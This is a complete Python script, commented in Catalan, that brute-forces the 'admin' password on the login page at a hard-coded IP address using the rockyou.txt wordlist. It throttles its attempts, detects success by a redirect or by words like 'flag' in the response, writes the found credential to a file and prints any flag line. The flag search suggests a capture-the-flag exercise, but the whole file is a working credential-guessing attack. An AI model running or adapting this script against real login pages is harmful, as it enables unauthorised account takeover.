import requests
import time
from tqdm import tqdm

# Configuració
url_login = "http://13.51.146.239:8082/login.php"
username = "admin"
diccionari = "rockyou.txt"
intents_per_seg = 5
debug = False  # posa True si vols veure les respostes

# Crear sessió per gestionar cookies
sessio = requests.Session()

def provar_credencial(password):
    try:
        resposta = sessio.post(url_login, data={"username": username, "password": password}, allow_redirects=True)
        
        if debug:
            print(f"[{password}] → {resposta.status_code}")
            print(resposta.text[:200])

        # Casos possibles d'èxit
        if "flag" in resposta.text.lower() or "bienvenido" in resposta.text.lower() or resposta.status_code == 302:
            return True, resposta.text
    except Exception as e:
        print(f"[!] Error amb {password}: {e}")
    return False, None

def main():
    try:
        with open(diccionari, "r", encoding="latin1") as f:
            paraules = [p.strip() for p in f if p.strip()]
    except FileNotFoundError:
        print(f"❌ No s'ha trobat el fitxer {diccionari}")
        return

    print(f"🔐 Iniciant força bruta contra: {url_login}")
    print(f"👤 Usuari: {username}")
    print(f"🔎 Provant {len(paraules)} contrasenyes...\n")

    for password in tqdm(paraules, desc="🔍 Provant"):
        correcte, resposta = provar_credencial(password)
        if correcte:
            print(f"\n✅ TROBAT! {username}:{password}")
            with open("resultat.txt", "w") as out:
                out.write(f"{username}:{password}\n")
            if "flag" in resposta.lower():
                print("\n🏁 FLAG:")
                for linia in resposta.splitlines():
                    if "flag" in linia.lower():
                        print(linia.strip())
            break
        time.sleep(1 / intents_per_seg)
    else:
        print("\n❌ Cap credencial vàlida trobada.")

if __name__ == "__main__":
    main()
